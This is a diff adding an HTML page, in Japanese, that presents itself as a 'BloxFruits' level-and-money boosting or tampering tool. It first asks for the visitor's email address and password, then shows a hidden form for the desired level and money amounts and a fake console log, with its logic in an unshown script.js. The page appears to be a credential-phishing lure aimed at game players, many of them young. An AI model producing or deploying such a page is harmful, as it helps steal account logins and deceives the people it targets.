@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BloxFruits 強化ツール</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { font-family: 'Roboto', sans-serif; }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-slate-900 to-gray-800 text-white min-h-screen flex items-center justify-center p-4">
+
+  <div class="bg-white text-gray-900 p-8 rounded-2xl shadow-2xl w-full max-w-lg space-y-6">
+    <h1 class="text-3xl font-bold text-center text-indigo-700">BloxFruits 情報改竄ツール</h1>
+
+    <form id="account-form" class="space-y-4">
+      <input id="username" placeholder="mailaddress" class="w-full px-4 py-2 border rounded focus:ring-indigo-500 focus:outline-none" required />
+      <input id="password" type="password" placeholder="password" class="w-full px-4 py-2 border rounded focus:ring-indigo-500 focus:outline-none" required />
+      <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 rounded">次へ</button>
+    </form>
+
+    <form id="boost-form" class="space-y-4 hidden">
+      <input id="level-amount" type="number" min="1" placeholder="増やしたいレベル数" class="w-full px-4 py-2 border rounded focus:ring-indigo-500 focus:outline-none" required />
+      <input id="money-amount" type="number" min="1" placeholder="増やしたいお金の額" class="w-full px-4 py-2 border rounded focus:ring-indigo-500 focus:outline-none" required />
+      <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 rounded">送信</button>
+    </form>
+
+    <div id="log" class="hidden bg-black text-green-400 font-mono text-sm rounded p-4 h-40 overflow-y-auto whitespace-pre-line"></div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
